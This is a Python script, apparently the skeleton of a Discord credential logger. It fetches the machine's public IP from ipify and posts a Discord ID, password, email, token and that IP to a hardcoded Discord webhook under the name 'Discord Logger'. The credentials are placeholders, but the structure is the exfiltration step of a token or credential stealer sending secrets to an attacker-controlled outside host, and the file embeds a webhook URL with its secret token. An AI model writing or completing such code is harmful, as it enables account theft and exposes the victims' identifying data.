import requests
import socket
import os

# Webhook URL
WEBHOOK_URL = 'https://discord.com/api/webhooks/1541433918895431680/nn6xsk7Ks_lCRdO5fmTKfKO9r2s9hNgJeRZcbh56sC02PtsR9bfpN-BewmHieRVSU9il'

# Function to get the public IP address
def get_public_ip():
    try:
        response = requests.get('https://api.ipify.org?format=json')
        return response.json()['ip']
    except Exception as e:
        return 'Unknown'

# Function to log data to Discord
def log_to_discord(data):
    try:
        response = requests.post(WEBHOOK_URL, json=data)
        if response.status_code == 204:
            print('Data logged successfully.')
        else:
            print(f'Failed to log data: {response.status_code}')
    except Exception as e:
        print(f'Error logging data: {e}')

# Main function
def main():
    # Hardcoded Discord credentials
    discord_id = 'user123'
    discord_password = 'password123'
    discord_email = 'user123@example.com'
    discord_token = 'token123'

    # Get public IP address
    ip_address = get_public_ip()

    # Prepare data to send
    data = {
        'content': f'Discord ID: {discord_id}\nPassword: {discord_password}\nEmail: {discord_email}\nIP: {ip_address}\nToken: {discord_token}',
        'username': 'Discord Logger',
        'avatar_url': 'https://i.pinimg.com/736x/7a/ec/a0/7aeca0260f0fa319d85cd9d10e1cfbd9.jpg'
    }

    # Log data to Discord
    log_to_discord(data)

if __name__ == '__main__':
    main()
